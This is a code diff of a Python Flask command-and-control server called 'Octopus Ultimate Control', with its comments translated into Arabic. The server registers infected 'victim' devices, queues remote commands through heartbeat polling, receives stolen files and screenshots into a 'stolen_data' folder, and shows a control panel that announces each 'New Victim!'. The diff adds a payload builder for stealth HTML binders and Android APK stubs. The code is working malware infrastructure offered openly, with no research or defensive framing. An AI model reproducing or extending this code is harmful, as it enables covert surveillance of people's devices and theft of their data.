@@ -14,35 +14,36 @@ from cryptography.fernet import Fernet
 import io
 
 # ==========================================
-# Advanced System Settings
+# إعدادات النظام المتقدمة
 # ==========================================
 APP_NAME = "Octopus Ultimate Control v8.0"
 VERSION = "8.0.0"
+AUTHOR = "Octopus Dev"
 
-# Directories & Files
+# إعدادات المجلدات والملفات
 BASE_DIR = os.path.dirname(os.path.abspath(__file__))
 DB_PATH = os.path.join(BASE_DIR, "octopus_core.db")
 LOGS_DIR = os.path.join(BASE_DIR, "system_logs")
 UPLOADS_DIR = os.path.join(BASE_DIR, "stolen_data")
 APK_DIR = os.path.join(BASE_DIR, "payloads")
 
-# Ensure directories exist
+# إنشاء المجلدات الضرورية
 for directory in [LOGS_DIR, UPLOADS_DIR, APK_DIR]:
     if not os.path.exists(directory):
         os.makedirs(directory)
 
-# Encryption Setup
+# إعدادات التشفير والأمان
 ENCRYPTION_KEY = Fernet.generate_key()
 cipher = Fernet(ENCRYPTION_KEY)
 
-# Flask Server Config
+# إعدادات السيرفر
 app = Flask(__name__)
 app.config['SECRET_KEY'] = os.urandom(24)
 app.config['MAX_CONTENT_LENGTH'] = 500 * 1024 * 1024  # 500MB Upload Limit
 CORS(app, resources={r"/*": {"origins": "*"}})
 socketio = SocketIO(app, cors_allowed_origins="*", async_mode='threading')
 
-# Logging Configuration
+# إعداد التسجيل (Logging)
 logging.basicConfig(
     level=logging.INFO,
     format='%(asctime)s [%(levelname)s] %(message)s',
@@ -54,7 +55,7 @@ logging.basicConfig(
 logger = logging.getLogger(__name__)
 
 # ==========================================
-# Database Management (SQLite)
+# إدارة قاعدة البيانات (SQLite)
 # ==========================================
 class DatabaseManager:
     def __init__(self, db_path):
@@ -65,11 +66,11 @@ class DatabaseManager:
         return sqlite3.connect(self.db_path)
 
     def init_db(self):
-        """Initialize database schema"""
+        """تهيئة جداول قاعدة البيانات"""
         conn = self.get_connection()
         cursor = conn.cursor()
 
-        # Devices Table
+        # جدول الأجهزة (الضحايا)
         cursor.execute('''
             CREATE TABLE IF NOT EXISTS devices (
                 id TEXT PRIMARY KEY,
@@ -89,7 +90,7 @@ class DatabaseManager:
             )
         ''')
 
-        # Commands Table
+        # جدول الأوامر
         cursor.execute('''
             CREATE TABLE IF NOT EXISTS commands (
                 id INTEGER PRIMARY KEY AUTOINCREMENT,
@@ -103,7 +104,7 @@ class DatabaseManager:
             )
         ''')
 
-        # Files Table
+        # جدول الملفات المسروقة
         cursor.execute('''
             CREATE TABLE IF NOT EXISTS files (
                 id INTEGER PRIMARY KEY AUTOINCREMENT,
@@ -117,7 +118,7 @@ class DatabaseManager:
             )
         ''')
 
-        # Logs Table
+        # جدول سجلات النشاط
         cursor.execute('''
             CREATE TABLE IF NOT EXISTS activity_logs (
                 id INTEGER PRIMARY KEY AUTOINCREMENT,
@@ -132,7 +133,7 @@ class DatabaseManager:
         conn.close()
         logger.info("Database initialized successfully.")
 
-    # --- Device Operations ---
+    # --- عمليات الأجهزة ---
     def register_device(self, data, ip):
         conn = self.get_connection()
         cursor = conn.cursor()
@@ -191,7 +192,7 @@ class DatabaseManager:
         conn.close()
         return devices
 
-    # --- Command Operations ---
+    # --- عمليات الأوامر ---
     def add_command(self, device_id, cmd_type, payload):
         conn = self.get_connection()
         cursor = conn.cursor()
@@ -215,14 +216,14 @@ class DatabaseManager:
                     "type": row[1],
                     "data": json.loads(row[2]) if row[2] else {}
                 })
-                # Mark as sent (simplistic queue logic)
+                # تحديث الحالة إلى "تم الاستلام"
                 cursor.execute("UPDATE commands SET status = 'sent' WHERE id = ?", (row[0],))
             conn.commit()
             return cmds
         finally:
             conn.close()
 
-    # --- File Operations ---
+    # --- عمليات الملفات ---
     def save_file_record(self, device_id, filename, file_type, size, path):
         conn = self.get_connection()
         cursor = conn.cursor()
@@ -243,14 +244,15 @@ class DatabaseManager:
 db = DatabaseManager(DB_PATH)
 
 # ==========================================
-# Background Services
+# خدمات الخلفية (Background Services)
 # ==========================================
 def cleanup_service():
-    """Mark inactive devices as offline"""
+    """خدمة تنظيف الأجهزة غير النشطة"""
     while True:
         try:
             conn = db.get_connection()
             cursor = conn.cursor()
+            # تعيين حالة الأجهزة القديمة إلى offline
             cutoff = datetime.now() - timedelta(minutes=5)
             cursor.execute("UPDATE devices SET status = 'offline' WHERE last_seen < ?", (cutoff.isoformat(),))
             conn.commit()
@@ -262,12 +264,12 @@ def cleanup_service():
 threading.Thread(target=cleanup_service, daemon=True).start()
 
 # ==========================================
-# API Endpoints
+# واجهة برمجة التطبيقات (API Endpoints)
 # ==========================================
 
 @app.route('/api/connect', methods=['POST'])
 def api_connect():
-    """Initial device connection"""
+    """نقطة اتصال أولية للجهاز"""
     data = request.json
     ip = request.remote_addr
     if db.register_device(data, ip):
@@ -277,19 +279,19 @@ def api_connect():
 
 @app.route('/api/heartbeat', methods=['POST'])
 def api_heartbeat():
-    """Heartbeat & Command Polling"""
+    """استلام نبضات القلب"""
     data = request.json
     device_id = data.get('device_id')
     if device_id:
         db.update_heartbeat(device_id)
-        # Check for pending commands
+        # التحقق من وجود أوامر
         cmds = db.get_pending_commands(device_id)
         return jsonify({"status": "ok", "commands": cmds})
     return jsonify({"status": "error"}), 400
 
 @app.route('/api/upload', methods=['POST'])
 def api_upload():
-    """Handle file uploads (including screenshots)"""
+    """استلام الملفات والصور"""
     try:
         device_id = request.form.get('device_id')
         file_type = request.form.get('type', 'file')
@@ -323,7 +325,7 @@ def api_upload():
 
 @app.route('/api/command', methods=['POST'])
 def api_send_command():
-    """Send command to device"""
+    """إرسال أمر من لوحة التحكم"""
     data = request.json
     device_id = data.get('device_id')
     cmd_type = data.get('type')
@@ -333,20 +335,15 @@ def api_send_command():
         return jsonify({"status": "queued"})
     return jsonify({"status": "error"}), 500
 
-@app.route('/api/students', methods=['GET'])
-def api_get_students():
-    """Get all devices for client app"""
-    devices = db.get_all_devices()
-    return jsonify([dict(d) for d in devices])
-
 # ==========================================
-# Web UI (Control Panel)
+# واجهة الويب (Control Panel UI)
 # ==========================================
 
 @app.route('/control')
 def control_panel():
     devices = db.get_all_devices()
     
+    # إحصائيات سريعة
     total = len(devices)
     online = len([d for d in devices if d['status'] == 'online'])
     
@@ -388,6 +385,7 @@ def control_panel():
             .main-content {{ height: 100vh; overflow-y: auto; }}
             .card {{ background: #1e293b; border: 1px solid #334155; }}
             .table {{ --bs-table-bg: transparent; }}
+            .btn-action {{ width: 100%; text-align: left; margin-bottom: 5px; }}
         </style>
     </head>
     <body>
@@ -396,27 +394,110 @@ def control_panel():
                 <div class="col-md-2 sidebar p-3">
                     <h3 class="text-success mb-4"><i class="fas fa-spider"></i> OCTOPUS</h3>
                     <div class="d-grid gap-2">
-                        <button class="btn btn-primary" onclick="location.reload()"><i class="fas fa-sync"></i> Refresh</button>
+                        <button class="btn btn-primary" onclick="showTab('dashboard')"><i class="fas fa-tachometer-alt"></i> Dashboard</button>
+                        <button class="btn btn-outline-light" onclick="showTab('files')"><i class="fas fa-folder"></i> Files</button>
+                        <button class="btn btn-outline-light" onclick="showTab('builder')"><i class="fas fa-hammer"></i> Builder</button>
                     </div>
-                </div>
-                <div class="col-md-10 main-content p-4">
-                    <div class="row mb-4">
-                        <div class="col-md-3"><div class="card"><div class="card-body text-center"><h3>{total}</h3><small>Total Devices</small></div></div></div>
-                        <div class="col-md-3"><div class="card"><div class="card-body text-center"><h3 class="text-success">{online}</h3><small>Online Now</small></div></div></div>
-                    </div>
-                    <div class="card">
-                        <div class="card-header">Connected Victims</div>
-                        <div class="table-responsive">
-                            <table class="table table-hover">
-                                <thead><tr><th>ID</th><th>Model</th><th>OS</th><th>Status</th><th>Battery</th><th>Last Seen</th><th>Actions</th></tr></thead>
-                                <tbody>{device_rows}</tbody>
-                            </table>
+                    
+                    <div class="mt-auto pt-5">
+                        <div class="card bg-dark">
+                            <div class="card-body">
+                                <small class="text-muted">Server Status</small>
+                                <div class="d-flex align-items-center">
+                                    <div class="spinner-grow spinner-grow-sm text-success me-2"></div>
+                                    <span>Online</span>
+                                </div>
+                            </div>
                         </div>
                     </div>
                 </div>
+
+                <div class="col-md-10 main-content p-4">
+                    <div id="dashboard" class="tab-content">
+                        <div class="row mb-4">
+                            <div class="col-md-3">
+                                <div class="card"><div class="card-body text-center">
+                                    <h3>{total}</h3><small>Total Devices</small>
+                                </div></div>
+                            </div>
+                            <div class="col-md-3">
+                                <div class="card"><div class="card-body text-center">
+                                    <h3 class="text-success">{online}</h3><small>Online Now</small>
+                                </div></div>
+                            </div>
+                        </div>
+
+                        <div class="card">
+                            <div class="card-header d-flex justify-content-between">
+                                <h5 class="mb-0">Connected Victims</h5>
+                                <button class="btn btn-sm btn-light" onclick="location.reload()"><i class="fas fa-sync"></i></button>
+                            </div>
+                            <div class="table-responsive">
+                                <table class="table table-hover">
+                                    <thead>
+                                        <tr>
+                                            <th>ID</th>
+                                            <th>Model</th>
+                                            <th>OS</th>
+                                            <th>Status</th>
+                                            <th>Battery</th>
+                                            <th>Last Seen</th>
+                                            <th>Actions</th>
+                                        </tr>
+                                    </thead>
+                                    <tbody>
+                                        {device_rows}
+                                    </tbody>
+                                </table>
+                            </div>
+                        </div>
+                    </div>
+                    
+                    <div id="builder" class="tab-content d-none">
+                        <div class="card">
+                            <div class="card-header"><h5>APK / HTML Payload Builder</h5></div>
+                            <div class="card-body">
+                                <div class="mb-3">
+                                    <label>Payload Type</label>
+                                    <select class="form-select bg-dark text-light">
+                                        <option>HTML Stealth Binder</option>
+                                        <option>Android APK (Stub)</option>
+                                    </select>
+                                </div>
+                                <div class="mb-3">
+                                    <label>LHOST (Server URL)</label>
+                                    <input type="text" class="form-control bg-dark text-light" value="{request.host_url}">
+                                </div>
+                                <button class="btn btn-danger w-100" onclick="alert('Building payload...')">
+                                    <i class="fas fa-radiation"></i> Generate Payload
+                                </button>
+                            </div>
+                        </div>
+                    </div>
+
+                </div>
             </div>
         </div>
+
+        <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.0.1/socket.io.js"></script>
         <script>
+            const socket = io();
+            
+            socket.on('device_connected', (data) => {{
+                // Show notification
+                const toast = document.createElement('div');
+                toast.className = 'toast show position-fixed bottom-0 end-0 m-3';
+                toast.innerHTML = `<div class="toast-header"><strong class="me-auto">New Victim!</strong></div><div class="toast-body">${{data.model}} connected.</div>`;
+                document.body.appendChild(toast);
+                setTimeout(() => toast.remove(), 3000);
+            }});
+
+            function showTab(id) {{
+                document.querySelectorAll('.tab-content').forEach(el => el.classList.add('d-none'));
+                document.getElementById(id).classList.remove('d-none');
+            }}
+
             function quickCommand(id, type) {{
                 let payload = {{}};
                 if(type === 'alert') {{
@@ -424,11 +505,17 @@ def control_panel():
                     if(!msg) return;
                     payload = {{message: msg}};
                 }}
+                
                 fetch('/api/command', {{
                     method: 'POST',
                     headers: {{'Content-Type': 'application/json'}},
                     body: JSON.stringify({{device_id: id, type: type, payload: payload}})
                 }}).then(r => r.json()).then(d => alert(d.status));
+            }}
+            
+            function selectDevice(id) {{
+                // Logic to open detailed device view
+                alert("Opening control panel for: " + id);
             }}
         </script>
     </body>
@@ -441,8 +528,9 @@ def download_file(filename):
     return send_file(os.path.join(UPLOADS_DIR, filename))
 
 # ==========================================
-# Run Server
+# تشغيل السيرفر
 # ==========================================
 if __name__ == '__main__':
     port = int(os.environ.get('PORT', 5000))
+    # تشغيل SocketIO لدعم الاتصال في الوقت الحقيقي
     socketio.run(app, host='0.0.0.0', port=port, allow_unsafe_werkzeug=True)
